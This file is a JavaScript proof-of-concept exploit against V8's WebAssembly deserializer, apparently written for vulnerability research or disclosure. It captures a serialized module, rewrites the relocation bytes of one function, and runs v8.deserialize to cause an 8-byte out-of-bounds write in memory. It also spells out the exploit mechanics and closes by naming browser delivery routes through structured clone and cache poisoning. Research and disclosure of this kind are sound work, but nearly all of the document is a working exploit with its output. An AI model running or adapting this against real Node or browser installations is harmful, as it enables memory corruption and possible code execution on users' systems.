// V8 Wasm Deserialization — Reloc Stream OOB Write (no --allow-natives-syntax)
// File:   src/wasm/wasm-serialization.cc:1103
// CWE-787 (Out-of-bounds Write) · severity: HIGH
//
// Same root cause as reloc_oob_poc.js.  Uses Node.js built-in v8.serialize /
// v8.deserialize (structured clone) instead of %SerializeWasmModule /
// %DeserializeWasmModule.  No --allow-natives-syntax flag required.
//
// Call chain:
//   v8.serialize(wasmModule)
//     → ValueSerializer::WriteWasmModule
//     → NativeModuleSerializer::Serialize     ← writes reloc_data inline
//   v8.deserialize(craftedBuf)
//     → ValueDeserializer::ReadWasmModule
//     → NativeModuleDeserializer::Deserialize
//     → CopyAndRelocate (line 1103)           ← reads crafted reloc_data
//     → WritableRelocIterator advances pc_ from attacker-controlled bytes
//     → set_wasm_call_address writes 8B at crafted pc_ (OOB)
//
// The structured clone buffer for a WebAssembly.Module contains:
//   [SC envelope prefix: a few bytes]
//   [wasm wire bytes: original .wasm binary]
//   [compiled code: NativeModuleSerializer output]  ← what we craft
//   [optional suffix bytes]
//
// We locate the compiled code section by:
//   1. Finding the wasm wire bytes magic (0x00 0x61 0x73 0x6d) in the buffer
//   2. Scanning ahead for code_kind=0x04 (TurboFan per-function header)
//
// Expected behaviour:
//   Debug build:   DCHECK at src/common/code-memory-access-inl.h:235
//   Release build: 8-byte OOB write to instruction_start + (code_size + 500)
//
// Run:
//   node --no-liftoff reloc_oob_no_natives.js
//   (--no-liftoff forces TurboFan so WASM_CALL relocs exist in the blob)

'use strict';
const v8 = require('v8');

// ── Minimal wasm: callee() returns 42, caller() calls callee() ───────────────
// caller's TurboFan output has a WASM_CALL reloc for the cross-function call.
const WASM = new Uint8Array([
  0x00,0x61,0x73,0x6d, 0x01,0x00,0x00,0x00,  // magic + version
  0x01,0x05, 0x01,0x60,0x00,0x01,0x7f,        // type: () -> i32
  0x03,0x03, 0x02,0x00,0x00,                   // 2 functions, type 0
  0x07,0x13, 0x02,                             // 2 exports
    0x06,0x63,0x61,0x6c,0x6c,0x65,0x65,0x00,0x00,  // "callee" = func 0
    0x06,0x63,0x61,0x6c,0x6c,0x65,0x72,0x00,0x01,  // "caller" = func 1
  0x0a,0x0b, 0x02,                             // code section
    0x04,0x00,0x41,0x2a,0x0b,                 // func0: i32.const 42, end
    0x04,0x00,0x10,0x00,0x0b,                 // func1: call 0, end
]);

console.log('[1] Compiling and warming to TurboFan...');
const mod  = new WebAssembly.Module(WASM);
const inst = new WebAssembly.Instance(mod);
for (let i = 0; i < 200000; i++) { inst.exports.callee(); inst.exports.caller(); }
console.log('    callee()=' + inst.exports.callee() + '  caller()=' + inst.exports.caller());

// ── Serialize via structured clone ────────────────────────────────────────────
// No %SerializeWasmModule / --allow-natives-syntax needed.
// v8.serialize is a standard Node.js built-in (require('v8')).
const sc = v8.serialize(mod);
console.log('[2] SC buffer: ' + sc.length + ' bytes');

// ── Locate compiled code blob within SC buffer ────────────────────────────────
// The blob global header is 29 bytes; the first per-function sub-header begins
// with code_kind (uint8), where 0x04 = TurboFan.  code_size (uint32 LE) is at
// +29 within the per-function header.
//
// Heuristic: find wasm magic bytes → scan forward for code_kind=0x04 at
// plausible offset → verify code_size is in a reasonable range.

const GLOBAL_HDR = 29;

function findBlobOffset(buf) {
  for (let i = 0; i + WASM.length < buf.length; i++) {
    // Match wasm magic
    if (buf[i] !== 0x00 || buf[i+1] !== 0x61 || buf[i+2] !== 0x73 || buf[i+3] !== 0x6d) continue;
    // Wire bytes start at i; compiled code follows within ~64 bytes
    const after_wire = i + WASM.length;
    for (let j = after_wire; j < after_wire + 64 && j + 60 < buf.length; j++) {
      if (buf[j] !== 0x04) continue;           // code_kind must be TurboFan
      const blob_start = j - GLOBAL_HDR;
      if (blob_start < 0) continue;
      const cs = buf.readUInt32LE(j + 29);     // code_size of func0
      if (cs >= 32 && cs <= 512) return blob_start;
    }
  }
  return -1;
}

const blob_off = findBlobOffset(sc);
if (blob_off < 0) {
  console.error('[!] Cannot locate compiled code blob in SC buffer.');
  console.error('    Try: node --no-liftoff reloc_oob_no_natives.js');
  process.exit(1);
}
console.log('[3] Compiled code blob at sc[' + blob_off + ']');

// ── Parse blob structure ───────────────────────────────────────────────────────
// Per-function block (relative to blob start):
//   global_header (29B) | [ func_header (54B) | code_data | reloc_data | ... ] × N
//
// func_header offsets:
//   +0:  code_kind  (uint8)
//   +29: code_size  (uint32 LE)
//   +33: reloc_size (uint32 LE) ← field we update
//   +37: src_pos_size, +41: inlining_size, +45: protected_size (uint32 each)
//   +53: tier       (uint8;  0x02 = TurboFan)
//   +54: code_data  (code_size bytes)
//        reloc_data (reloc_size bytes)  ← attacker-controlled in Deserialize
//        ...

function readEntry(blob_rel_off) {
  const a      = blob_off + blob_rel_off;
  const code_sz = sc.readUInt32LE(a + 29);
  const reloc_sz= sc.readUInt32LE(a + 33);
  const srcpos  = sc.readUInt32LE(a + 37);
  const inlsz   = sc.readUInt32LE(a + 41);
  const protsz  = sc.readUInt32LE(a + 45);
  const tier    = sc[a + 53];
  const reloc_start = blob_rel_off + 54 + code_sz;
  const block_sz    = 54 + code_sz + reloc_sz + srcpos + inlsz + protsz;
  return { code_sz, reloc_sz, srcpos, inlsz, protsz, tier, reloc_start, block_sz, off: blob_rel_off };
}

const f0 = readEntry(GLOBAL_HDR);
const f1 = readEntry(GLOBAL_HDR + f0.block_sz);

console.log('[4] func0 (callee): tier=0x' + f0.tier.toString(16) +
            ' code_sz=' + f0.code_sz + ' reloc_sz=' + f0.reloc_sz);
console.log('    func1 (caller): tier=0x' + f1.tier.toString(16) +
            ' code_sz=' + f1.code_sz + ' reloc_sz=' + f1.reloc_sz);

if (f1.tier !== 0x02) {
  console.log('[!] func1 is not TurboFan (tier=0x' + f1.tier.toString(16) + ').');
  console.log('    Re-run with: node --no-liftoff reloc_oob_no_natives.js');
  process.exit(0);
}

if (f1.reloc_sz > 0) {
  const abs_rs = blob_off + f1.reloc_start;
  const rb = [...sc.slice(abs_rs, abs_rs + f1.reloc_sz)];
  console.log('    func1 reloc_data: ' + rb.map(b=>b.toString(16).padStart(2,'0')).join(' '));
}

// ── Craft OOB reloc ───────────────────────────────────────────────────────────
// Reloc encoding (src/codegen/reloc-info.h):
//   kDefaultTag=3, kTagBits=2, kSmallPCDeltaBits=6
//   Mode byte:  (rmode << 2) | 3
//   Delta byte: pc_delta & 0x3F  (6 bits)
//
// Large delta → PC_JUMP entry:  mode_byte=0x5F, then VLQ for (delta >> 6)
//   VLQ reads backward (AdvanceReadLongPCJump), 1-byte VLQ if value < 128
//
// Mode constants:
//   WASM_CALL = 6  → 0x1B    PC_JUMP = 23 → 0x5F
//
// Crafted reloc [rem_delta, 0x1B, vlq, 0x5F] (iterator reads HIGH→LOW):
//   Step 1: 0x5F PC_JUMP  → pc_ += vlq × 64
//   Step 2: 0x1B WASM_CALL → pc_ += rem_delta
//   Result: pc_ = instruction_start + target_delta (OOB)
//
// CopyAndRelocate (line 1103):
//   GetWasmCalleeTag(iter.rinfo())       → reads 4B from OOB pc_
//   GetNearCallTargetForFunction(tag, …) → computes valid jump table address
//   set_wasm_call_address(target)        → writes 8B at OOB pc_
//   WriteUnalignedValue DCHECK fires (debug) or silent OOB write (release)

const WASM_CALL_BYTE = (6  << 2) | 3;   // 0x1B
const PC_JUMP_BYTE   = (23 << 2) | 3;   // 0x5F
const target_delta   = f1.code_sz + 500; // 500B past code buffer end
const pc_jump        = target_delta >> 6; // VLQ value (< 128 → 1-byte)
const rem_delta      = target_delta & 0x3f;
const new_reloc      = Buffer.from([rem_delta & 0x3f, WASM_CALL_BYTE, pc_jump & 0x7f, PC_JUMP_BYTE]);

console.log('\n[5] Crafted reloc:');
console.log('    target_delta = ' + f1.code_sz + ' + 500 = ' + target_delta);
console.log('    bytes: ' + [...new_reloc].map(b=>'0x'+b.toString(16).padStart(2,'0')).join(' '));

// ── Reconstruct SC buffer ─────────────────────────────────────────────────────
// Replace f1's reloc_data in-place (old: f1.reloc_sz bytes, new: 4 bytes → +1).
// f1's reloc_size header field must be updated to match.

const abs_reloc_start = blob_off + f1.reloc_start;
const abs_reloc_end   = abs_reloc_start + f1.reloc_sz;
const abs_rs_field    = blob_off + f1.off + 33;    // reloc_size field in f1 header
const size_delta      = new_reloc.length - f1.reloc_sz; // +1

const new_sc = Buffer.allocUnsafe(sc.length + size_delta);
sc.copy(new_sc, 0,                               0,             abs_reloc_start);
new_reloc.copy(new_sc, abs_reloc_start);
sc.copy(new_sc, abs_reloc_start + new_reloc.length, abs_reloc_end);

// Patch reloc_size field (located in prefix, before the reloc data, so offset is unchanged)
new_sc.writeUInt32LE(new_reloc.length, abs_rs_field);

console.log('[6] SC buffer reconstructed: ' + sc.length + 'B → ' + new_sc.length + 'B');
console.log('    reloc_size at sc[' + abs_rs_field + ']: ' +
            f1.reloc_sz + ' → ' + new_reloc.length);

// ── Trigger via v8.deserialize ────────────────────────────────────────────────
// No --allow-natives-syntax: v8.deserialize is a standard Node.js built-in.
// Internally calls NativeModuleDeserializer::Deserialize → CopyAndRelocate.
//
// DCHECK at code-memory-access-inl.h:235 (debug build):
//   DCHECK_LT(address - address_, size())
//   = DCHECK_LT(target_delta, jit_allocation_size)   [564 >> ~71] → fires
//
// Release build: OOB write proceeds, 8B at instruction_start + 564 corrupted.

console.log('\n[7] v8.deserialize(poisoned_sc) ...');
console.log('    Debug build:   DCHECK at src/common/code-memory-access-inl.h:235');
console.log('    Release build: 8-byte OOB write at instruction_start + ' + target_delta);

try {
  const poisoned = v8.deserialize(new_sc);
  if (poisoned instanceof WebAssembly.Module) {
    const pi = new WebAssembly.Instance(poisoned);
    console.log('\n[OOB WRITE EXECUTED]  (release build)');
    console.log('  v8.deserialize succeeded — NativeModuleDeserializer ran crafted reloc.');
    console.log('  8-byte write at instruction_start + ' + target_delta +
                ' (OOB by ' + (target_delta - f1.code_sz) + 'B)');
    console.log('  caller() = ' + pi.exports.caller() + '  (possible corruption)');
  } else {
    console.log('[INFO] v8.deserialize returned non-Module: ' + typeof poisoned);
  }
} catch (e) {
  console.log('[EXCEPTION] ' + e.message);
  console.log('  Debug: DCHECK fired before OOB write (expected).');
  console.log('  Release: deserialization rejected crafted blob (unexpected — investigate).');
}

console.log('\n╔══════════════════════════════════════════════════════════════════════╗');
console.log('║  Vulnerability: Reloc Stream OOB Write                              ║');
console.log('║  File:    src/wasm/wasm-serialization.cc:1103  CWE-787 · HIGH       ║');
console.log('║                                                                      ║');
console.log('║  Trigger (this file): v8.serialize / v8.deserialize                 ║');
console.log('║    — no --allow-natives-syntax required                              ║');
console.log('║    — v8 is a standard Node.js built-in module                       ║');
console.log('║                                                                      ║');
console.log('║  Trigger (browser): structured clone via postMessage / IDB           ║');
console.log('║    — same NativeModuleDeserializer code path                         ║');
console.log('║    — attacker intercepts cache bytes (CDN poisoning / SW)            ║');
console.log('╚══════════════════════════════════════════════════════════════════════╝');
